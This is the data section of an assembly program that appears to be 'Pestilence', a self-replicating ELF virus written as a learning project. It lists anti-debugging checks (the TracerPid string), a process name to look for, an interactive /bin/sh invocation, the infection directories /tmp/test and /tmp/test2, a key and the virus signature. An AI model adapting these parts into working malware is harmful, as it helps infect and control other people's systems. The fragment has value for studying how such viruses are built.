procdir: db "/proc/", 0

proc_status: db "/status", 0

proc_test:
    .string db "Name:	test", 10
	.len equ $ - proc_test.string

bin_sh:
    .sh db "/bin/sh", 0
    .arg1 db "+m", 0
    .arg2 db "-i", 0

no_trace:
    .string db "TracerPid:", 9,"0", 10
	.len equ $ - no_trace.string

self_status: db "/proc/self/status", 0

firstDir: db "/tmp/test", 0
secondDir: db "/tmp/test2", 0
key: db "1231231231"
signature: db "Pestilence version 1.0 (c)oded by <mtaquet>-<matheme>"
signature_end:
    db " ["
signature_key: db "1234567812345678"
    db "]"
_end:

